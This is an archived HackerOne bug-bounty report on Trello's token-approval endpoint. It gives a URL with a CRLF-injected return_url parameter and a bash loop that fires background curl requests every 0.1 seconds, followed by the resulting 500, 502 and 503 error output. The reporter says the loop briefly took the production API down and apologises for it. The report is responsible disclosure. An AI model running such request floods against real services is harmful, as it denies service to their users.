@@ -1,0 +1,91 @@
+ReportLink:https://hackerone.com/reports/259151
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/sireeeeens
+ReportedTo:Trello(trello)
+BountyAmount:128.0
+Severity:low
+State:Closed
+DateOfDisclosure:30.08.2017 20:33:12
+
+Summary:
+
+Just found this, tested it on a whim and deeply regretted it. Sorry!
+
+So to recreate the issue:
+
+1. Visit https://trello.com/1/authorize?response_type=token&key=41257716bae3f0f35422a228fbd18c97&response_type=token&return_url=%0d%0aheader:%20text/html&scope=read,write,account&expiration=never&name=Trello%20for%20Chrome
+2. Approve the request. The request will hang for 30 seconds before producing a 500 internal server error
+3. Perform a resource exhaustion, use up all the queues. 
+
+
+Example:
+
+```
+#!/bin/bash
+
+while true; do
+	curl 'https://trello.com/1/token/approve' -H 'origin: https://trello.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.8' -H 'upgrade-insecure-requests: 1' -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'content-type: application/x-www-form-urlencoded' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'cache-control: max-age=0' -H 'authority: trello.com' -H 'cookie: COOOOOKIE' -H 'referer: https://trello.com/1/authorize?requestKey=400979701fa69b741e58938e04604110' --data 'approve=Allow&requestKey=400979701fa69b741e58938e04604110&signature=1502523742327%2F1483c1920cd26c901751829f498e76993056cb05ac6a1893602ad4970811c00a' --compressed & sleep 0.1
+	
+done
+```
+
+This produced the following output in about five seconds. I switched off wifi on my phone and tried to load the authorization page and I was met with the same service unavailable error as shown in the logs. Two different IPs showed a resource exhaustion which led me to believe that I had stumbled upon a denial of service bug.
+
+```
+Internal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server Error<HTML><HEAD>
+<TITLE>Service Unavailable</TITLE>
+</HEAD><BODY>
+<H1>Service Unavailable - Zero size object</H1>
+The server is temporarily unable to service your request.  Please try again
+later.<P>
+Reference&#32;&#35;15&#46;1a35d417&#46;1502522741&#46;7fec409
+</BODY></HTML>
+Internal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server Error<HTML><HEAD>
+<TITLE>Service Unavailable</TITLE>
+</HEAD><BODY>
+<H1>Service Unavailable - Zero size object</H1>
+The server is temporarily unable to service your request.  Please try again
+later.<P>
+Reference&#32;&#35;15&#46;1a35d417&#46;1502522745&#46;7fefe37
+</BODY></HTML>
+<HTML><HEAD>
+<TITLE>Service Unavailable</TITLE>
+</HEAD><BODY>
+<H1>Service Unavailable - Zero size object</H1>
+The server is temporarily unable to service your request.  Please try again
+later.<P>
+Reference&#32;&#35;15&#46;1a35d417&#46;1502522745&#46;7ff09aa
+</BODY></HTML>
+<html><body><h1>502 Bad Gateway</h1>
+The server returned an invalid or incomplete response.
+</body></html>
+Internal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server Error<HTML><HEAD>
+<TITLE>Service Unavailable</TITLE>
+</HEAD><BODY>
+<H1>Service Unavailable - Zero size object</H1>
+The server is temporarily unable to service your request.  Please try again
+later.<P>
+Reference&#32;&#35;15&#46;1a35d417&#46;1502522748&#46;7feea36
+</BODY></HTML>
+Internal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server Error<html><body><h1>502 Bad Gateway</h1>
+The server returned an invalid or incomplete response.
+</body></html>
+<HTML><HEAD>
+<TITLE>Service Unavailable</TITLE>
+</HEAD><BODY>
+<H1>Service Unavailable - Zero size object</H1>
+The server is temporarily unable to service your request.  Please try again
+later.<P>
+Reference&#32;&#35;15&#46;1a35d417&#46;1502522750&#46;7fef8bb
+</BODY></HTML>
+<html><body><h1>502 Bad Gateway</h1>
+The server returned an invalid or incomplete response.
+</body></html>
+Internal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server ErrorInternal Server Error
+```
+
+I smashed Control-C immediately because taking down a production API was not what I expected, I expected to get hit by rate limiting or something else really.
+
+As a note though, I obviously only tried this exactly once and only for about 10 seconds so I can't be absolutely sure if this works all the time because I can't in good faith try and hit the server rapidly again. 
+
+I'd like to apologize again for temporarily downing the prod API.
